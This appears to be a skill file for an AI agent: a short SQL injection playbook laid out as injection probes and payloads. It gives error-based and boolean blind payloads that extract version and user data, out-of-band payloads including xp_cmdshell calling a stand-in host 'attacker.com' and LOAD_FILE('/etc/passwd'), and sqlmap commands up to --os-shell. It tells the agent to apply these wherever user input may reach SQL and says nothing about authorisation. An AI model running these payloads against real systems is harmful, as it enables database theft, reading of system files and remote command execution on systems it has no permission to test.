---
name: sqli-sql-injection
description: SQL injection playbook. Use when user input may reach SQL queries — GET/POST params, headers, cookies, JSON fields, GraphQL args.
---

# SKILL: SQL Injection

## 1. DETECTION

```
'         → syntax error or 500
''        → no error (string closed)
1'--      → strip rest of query
1 AND 1=1 → same as baseline
1 AND 1=2 → different response
```

## 2. ERROR-BASED

```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## 3. BLIND - BOOLEAN

```sql
1' AND SUBSTRING(version(),1,1)='5'--
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

## 4. OUT-OF-BAND

```sql
'; EXEC xp_cmdshell('nslookup attacker.com')--
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

## 5. SQLMAP

```bash
sqlmap -u 'https://target/page?id=1' --dbs
sqlmap -u 'https://target/page?id=1' -D dbname --tables
sqlmap -u 'https://target/page?id=1' --os-shell
```
